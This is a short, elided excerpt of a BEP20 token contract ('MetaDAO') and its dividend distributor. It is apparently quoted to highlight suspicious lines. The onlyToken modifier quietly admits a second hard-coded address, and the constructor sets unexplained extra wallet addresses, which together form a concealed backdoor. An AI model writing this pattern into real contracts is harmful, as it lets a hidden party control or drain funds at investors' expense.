...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x0a7E2B7B5Ef0549661cFb5B2D9dD5B7cB42BC95F)); _;
    }
...
contract MetaDAO is IBEP20 , Auth, BaseToken {
    ...
    constructor(
        ...
        marketingWallet = 0xc927aC9dFFfc21F921ADDD28B8570613B9651Aa5;  //marketingwallet
        another = [0xc782c467Ba904F86f8E1b9D35026F0c129C11E68,0xC9e8A6DCC6973C8C7266E600c4aB3C613cFC3Af6];     
